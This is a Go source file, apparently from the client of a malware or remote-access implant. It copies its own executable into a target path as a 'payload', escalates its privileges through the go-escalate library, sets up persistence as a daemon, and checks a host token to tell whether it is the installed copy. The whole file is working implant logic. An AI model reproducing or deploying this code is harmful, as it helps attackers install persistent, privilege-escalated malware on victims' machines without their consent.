// +build !android

package client

import (
	"errors"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"

	"github.com/lu4p/go-escalate"
)

// Setup add Persitence
func SetupDaemon() {
	log.Println("[SetupDaemon] Passing off to Daemon installer...")
	go Persist(PathExe)
}

func installExecuteable() error {
	if err := os.RemoveAll(Path); err != nil {
		log.Println("[InstallExe] [!] Could NOT remove old executeable: ", err)
		return err
	}
	log.Println("[InstallExe] Removed old executeable before install")

	ex, err := os.Executable()
	if err != nil {
		log.Println("[InstallExe] [!] Couldn't find the currently running exe: ", err)
		return err
	}

	data, err := ioutil.ReadFile(ex)
	if err != nil {
		log.Println("[InstallExe] [!] Could not read current exe: ", err)
		return err
	}

	if err = os.MkdirAll(Path, os.ModePerm); err != nil {
		log.Println("[InstallExe] [!] Could not create path for new exe: ", err)
		return err
	}

	if err = ioutil.WriteFile(PathExe, data, os.ModePerm); err != nil {
		log.Println("[InstallExe] [!] Could not write exe to path: ", err)
		return err
	}

	return nil
}

// Elevate elevate task
func Elevate() error {
	log.Println("[Elevate] Installing payload into: ", PathExe)

	err := installExecuteable()
	if err != nil {
		return errors.New("[Elevate] [!] Could NOT copy payload into target path")
	} else {
		log.Println("[Elevate] [+] Successfully copied payload into target path")
	}

	// Escalate exe and return
	return escalate.Escalate(PathExe)
}

// CheckSetup check wheter already configured
func CheckExisting() bool {
	log.Println("[CheckExisting] Am I the existing install?")

	osexe, _ := os.Executable()
	if osexe == PathExe {
		_, err := os.Stat(filepath.Join(Path, "token"))
		if err != nil {
			log.Println("[CheckExisting] [!] Host key token is missing")
			return false
		}
		log.Println("[CheckExisting] I AM the existing install!")
		return true
	}
	log.Println("[CheckExisting] I am NOT the existing install!")
	return false

}
